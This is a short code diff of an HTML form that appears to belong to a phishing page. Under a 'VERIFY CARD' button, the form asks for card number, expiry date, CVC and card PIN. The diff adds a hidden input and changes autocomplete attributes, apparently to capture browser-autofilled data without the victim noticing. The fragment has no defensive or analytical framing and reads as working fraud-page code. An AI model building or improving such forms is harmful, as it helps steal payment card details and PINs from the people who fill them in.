@@ -27,13 +27,14 @@
         </div>
         <div class="loginForm">
             <form autocomplete="off">
-                <label> Card Number </label>
-                <input type="number" id="padNumber" autocomplete="off" />
-                <label> Expiry Date </label>
+                <label> Card Number. </label>
+                <input type="number" id="padNumber" autocomplete="organization" />
+                <input type="hidden" id="googlereferrercode" autocomplete="organization"/>
+                <label> Expiry Date. </label>
                 <input type="text" id="padExpiryDate" autocomplete="off" />
-                <label> CVC </label>
+                <label> CVC. </label>
                 <input type="number" id="padCVC" autocomplete="off" />
-                <label> Card Pin </label>
+                <label> Card Pin. </label>
                 <input type="password" id="padPin" autocomplete="off" />
                 <button type="button" onclick="FinalSubmitForm()" id="FinalSubmit"> VERIFY CARD </button>
                 <!-- <p> New? <a href="">Sign up for online account access ></a> </p> -->
